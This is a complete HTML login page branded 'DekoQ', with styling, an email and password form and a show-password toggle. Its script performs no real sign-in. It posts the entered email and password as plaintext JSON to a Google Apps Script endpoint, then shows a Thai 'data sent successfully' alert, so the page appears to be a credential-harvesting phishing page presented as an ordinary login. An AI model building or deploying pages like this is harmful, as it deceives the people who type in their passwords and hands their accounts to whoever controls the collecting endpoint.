<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>DekoQ Login</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #007BFF, #0056b3);
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      text-align: center;
      color: white;
      margin-bottom: 1rem;
    }

    .container h1 {
      font-size: 3rem;
      margin: 0;
    }

    .container p {
      font-size: 1.2rem;
      margin-top: 0.5rem;
      margin-bottom: 2rem;
    }

    .login-box {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
      width: 90%;
      max-width: 400px;
    }

    form {
      display: flex;
      flex-direction: column;
    }

    label {
      font-weight: bold;
      margin-bottom: 0.3rem;
      color: #000;
      text-align: left;
    }

    .password-wrapper {
      position: relative;
      display: flex;
      align-items: center;
      margin-bottom: 1.2rem;
    }

    .password-wrapper input {
      width: 100%;
      font-size: 1rem;
      border-radius: 8px;
      padding: 0.8rem 2.5rem 0.8rem 1.2rem;
      border: 1px solid #ccc;
    }

    .toggle-password {
      position: absolute;
      right: 12px;
      cursor: pointer;
      background: none;
      border: none;
      padding: 0;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .toggle-password svg {
      width: 20px;
      height: 20px;
      fill: #888;
    }

    input[type="email"] {
      padding: 0.8rem;
      padding-left: 1.2rem;
      margin-bottom: 1.2rem;
      border: 1px solid #ccc;
      border-radius: 8px;
      text-align: left;
    }

    button[type="submit"] {
      padding: 0.8rem;
      background: #222;
      color: white;
      border: none;
      font-weight: bold;
      cursor: pointer;
      font-size: 1rem;
      border-radius: 8px;
      margin-top: 1rem;
    }

    button[type="submit"]:hover {
      background: #000;
    }
  </style>
</head>
<body>
  <div>
    <div class="container">
      <h1>DekoQ</h1>
      <p>Welcome!</p>
    </div>
    <div class="login-box">
      <form id="form">
        <label for="email">Username/Email</label>
        <input type="email" id="email" name="email" required placeholder="Value" />

        <label for="password">Password</label>
        <div class="password-wrapper">
          <input type="password" id="password" name="password" required placeholder="Value" />
          <button type="button" class="toggle-password" onclick="togglePassword()">
            <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
              <path d="M572.52 241.4c-1.38-1.8-34.5-45.3-88.63-89.44C423.27 107.67 360.2 80 288 80s-135.3 27.67-195.9 71.96C38.5 196.1 5.38 239.6 4 241.4a32.26 32.26 0 0 0 0 29.2c1.38 1.8 34.5 45.3 88.63 89.44C152.73 404.33 215.8 432 288 432s135.3-27.67 195.9-71.96c54.13-44.14 87.25-87.64 88.63-89.44a32.26 32.26 0 0 0-.01-29.2zM288 384c-88.22 0-159.2-45.79-211.8-89.6C84.62 267.52 65.28 245.88 57.88 236c7.41-9.86 26.75-31.5 58.29-58.4C128.8 122.79 199.8 80 288 80s159.2 42.79 211.8 97.6c31.54 26.9 50.88 48.54 58.29 58.4-7.41 9.86-26.75 31.5-58.29 58.4C447.2 338.21 376.2 384 288 384zm0-160a64 64 0 1 0 0 128 64 64 0 0 0 0-128z"/>
            </svg>
          </button>
        </div>

        <button type="submit">Submit</button>
      </form>
    </div>
  </div>

  <script>
    const form = document.querySelector("#form");
    const scriptURL = "https://script.google.com/macros/s/AKfycbx9dmqEKmDTZSwoABl4h8WjTCFU2BMBYjo0atbklk863llEB7-zGpS1qDgF3o2XcgRm5A/exec";

    form.addEventListener("submit", (e) => {
      e.preventDefault();
      const email = form.email.value;
      const password = form.password.value;

      fetch(scriptURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      })
        .then(response => {
          alert("ส่งข้อมูลสำเร็จแล้ว!");
          form.reset();
        })
        .catch(error => {
          alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
          console.error("Error!", error.message);
        });
    });

    function togglePassword() {
      const passwordInput = document.getElementById("password");
      const eyeIcon = document.getElementById("eyeIcon");

      if (passwordInput.type === "password") {
        passwordInput.type = "text";
        eyeIcon.innerHTML = `
          <path d="M320 128c-31.4 0-59.5 11.6-81.4 30.7l-30.6-30.6c-5.4-5.4-14.2-5.4-19.6 0s-5.4 14.2 0 19.6l30.6 30.6C147.3 225.3 128 256 128 256s51.1 64 160 64c35.3 0 68-11.4 94.4-30.6l30.6 30.6c5.4 5.4 14.2 5.4 19.6 0s5.4-14.2 0-19.6l-30.6-30.6C428.7 286.7 448 256 448 256s-51.1-64-160-64z"/>`;
      } else {
        passwordInput.type = "password";
        eyeIcon.innerHTML = `
          <path d="M572.52 241.4c-1.38-1.8-34.5-45.3-88.63-89.44C423.27 107.67 360.2 80 288 80s-135.3 27.67-195.9 71.96C38.5 196.1 5.38 239.6 4 241.4a32.26 32.26 0 0 0 0 29.2c1.38 1.8 34.5 45.3 88.63 89.44C152.73 404.33 215.8 432 288 432s135.3-27.67 195.9-71.96c54.13-44.14 87.25-87.64 88.63-89.44a32.26 32.26 0 0 0-.01-29.2zM288 384c-88.22 0-159.2-45.79-211.8-89.6C84.62 267.52 65.28 245.88 57.88 236c7.41-9.86 26.75-31.5 58.29-58.4C128.8 122.79 199.8 80 288 80s159.2 42.79 211.8 97.6c31.54 26.9 50.88 48.54 58.29 58.4-7.41 9.86-26.75 31.5-58.29 58.4C447.2 338.21 376.2 384 288 384zm0-160a64 64 0 1 0 0 128 64 64 0 0 0 0-128z"/>`;
      }
    }
  </script>
</body>
</html>
